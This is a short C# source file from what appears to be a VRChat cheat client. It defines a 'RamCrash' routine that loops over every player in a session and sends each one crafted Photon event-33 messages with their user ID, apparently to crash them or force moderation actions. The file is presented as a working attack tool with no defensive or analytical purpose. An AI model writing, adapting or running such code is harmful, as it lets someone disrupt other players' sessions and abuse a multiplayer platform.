using ExitGames.Client.Photon;
using Photon.Realtime;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using VRC;

namespace Daydream.Client.Hacks
{
    internal class RamCrash
    {
		public static void ramceash()
		{
			// ban
			foreach (VRC.Player player in Utility.Extentions.GetPlayers())
			{
				Utility.Logger.log("Ramcrash " + player.field_Private_APIUser_0.displayName);
				byte code = 33;
				Hashtable hashtable = new Hashtable();
				hashtable.Add("3", true);
				hashtable.Add("0", 22);
				hashtable.Add("1", player.field_Private_APIUser_0.id);
				RaiseEventOptions raiseEventOptions = new RaiseEventOptions();
				raiseEventOptions.field_Public_ReceiverGroup_0 = 0;
				SendOptions sendOptions = default(SendOptions);
				sendOptions.Channel = 0;
				sendOptions.Encrypt = true;
				Hacks.PhotonExtentions.OpRaiseEvent(code, hashtable, raiseEventOptions, sendOptions);
				byte code2 = 33;
				Hashtable hashtable2 = new Hashtable();
				hashtable2.Add("3", false);
				hashtable2.Add("0", 22);
				hashtable2.Add("1", player.field_Private_APIUser_0.id);
				RaiseEventOptions raiseEventOptions2 = new RaiseEventOptions();
				raiseEventOptions2.field_Public_ReceiverGroup_0 = 0;
				sendOptions = default(SendOptions);
				sendOptions.Channel = 0;
				sendOptions.Encrypt = true;
				Hacks.PhotonExtentions.OpRaiseEvent(code2, hashtable2, raiseEventOptions2, sendOptions);
			}
		}
	}
}
